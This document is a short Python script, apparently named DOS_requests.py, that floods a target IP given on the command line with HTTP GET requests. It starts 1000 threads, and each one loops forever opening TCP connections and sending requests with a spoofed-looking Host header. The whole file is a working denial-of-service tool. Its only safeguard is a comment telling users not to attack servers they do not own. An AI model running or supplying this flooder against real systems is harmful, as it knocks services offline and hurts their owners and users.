#!/usr/bin/python3

import threading
import socket
import sys

# don't attack a server that isn't yours

try:
	target = sys.argv[1]
	port = 80	# you can change the port number if the server works in the 443 for example
	fake_ip = "10.34.65.89"	# random ip address
except:
	print("usage: ./DOS_requests.py [ip]")
	sys.exit()
	
def attack():
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))
		s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
		s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
		s.close()
        	
for i in range(1000):
	t = threading.Thread(target=attack)
	t.start()
